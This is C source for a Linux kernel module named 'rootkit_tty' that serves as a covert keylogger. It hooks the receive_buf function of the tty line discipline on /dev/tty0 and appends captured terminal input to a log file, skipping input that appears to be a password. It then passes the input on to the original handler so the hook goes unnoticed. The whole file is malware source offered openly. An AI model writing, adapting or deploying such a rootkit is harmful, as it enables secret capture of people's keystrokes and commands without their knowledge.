#include "rootkit_tty.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("leisheyoufu");
MODULE_DESCRIPTION("tty logger");

static struct tty_logger *tty_log;

int write_to_file(char *logfile, const char *buf, int size)
{
    int ret = 0;
    struct file *f = NULL;

    BEGIN_KMEM;
    f = filp_open(logfile, O_CREAT|O_APPEND, 00600);
    if (IS_ERR(f))
    {
        CL_DBG_PRINT("Error %ld opening %s\n", -PTR_ERR(f), logfile);
        ret = -1;
    }
    else
    {
        if (f->f_op && f->f_op->write)
        {
            spin_lock(&tty_log->pty_lock);
            f->f_op->write(f, buf, size,&f->f_pos);
            spin_unlock(&tty_log->pty_lock);
        }
        else
        {
            CL_DBG_PRINT("%s does not have a write method\n",logfile);
            ret = -1;
        }

        if ((ret = filp_close(f,NULL)))
            CL_DBG_PRINT("Error %d closing %s\n", -ret, logfile);
    }
    END_KMEM;
    return ret;
}


void new_receive_buf(struct tty_struct *tty, const unsigned char *cp,
                     char *fp, int count)
{
    if(!IS_PASSWD(tty))
        write_to_file(LOG_FILE,cp,strlen(cp));
    (*old_receive_buf)(tty, cp, fp, count);
}


void tty_hook(struct tty_struct *tty)
{
    tty->ldisc->ops->receive_buf = new_receive_buf;
}


static inline struct tty_struct *file_tty(struct file *file)
{
    return ((struct tty_file_private *)file->private_data)->tty;
}

int my_open_tty(void)
{
    char dev_name[80];
    struct file *file;
    struct tty_ldisc *ld;
    struct tty_struct *tty;
    int ret;
    snprintf(dev_name,sizeof(dev_name),"/dev/tty0");
    BEGIN_KMEM
    file = filp_open(dev_name,O_RDONLY,0);
    if(IS_ERR(file))
    {
        CL_DBG_PRINT("Error %ld opening %s\n", -PTR_ERR(file), dev_name);
        return -EIO;
    }

    CL_DBG_PRINT("get tty\n");
    tty = file_tty(file);
    tty_log->tty = tty;
    if (!tty || (test_bit(TTY_IO_ERROR, &tty->flags)))
        return -EIO;

    CL_DBG_PRINT("get tty private_data\n");
    if(tty ==NULL)
    {
        CL_DBG_PRINT("No private data\n");
        return EIO;
    }
    ld = tty_ldisc_ref_wait(tty);
    if (ld->ops->receive_buf)
        old_receive_buf = ld->ops->receive_buf;
    else
        return -EIO;
    tty_ldisc_deref(ld);

    CL_DBG_PRINT("ldisc %p\n",tty->ldisc);

    tty_hook(tty);

    if ((ret = filp_close(file,NULL)))
        CL_DBG_PRINT("Error %d closing %s\n", -ret, dev_name);
    END_KMEM
    return 0;
}

static int __init rootkit_init(void)
{
    printk("rootkit init\n");
    tty_log = kmalloc(sizeof(struct tty_logger),GFP_KERNEL);
    if(!tty_log)
    {
        CL_DBG_PRINT("Out of memory\n");
        return -ENOMEM;
    }
    spin_lock_init(&tty_log->pty_lock);

    my_open_tty();
    return 0;
}
static void __exit rootkit_exit(void)
{
    printk("rootkit exit\n");
    if(tty_log)
    {
        tty_log->tty->ldisc->ops->receive_buf = old_receive_buf;
        kfree(tty_log);
    }
}

module_init(rootkit_init);
module_exit(rootkit_exit);


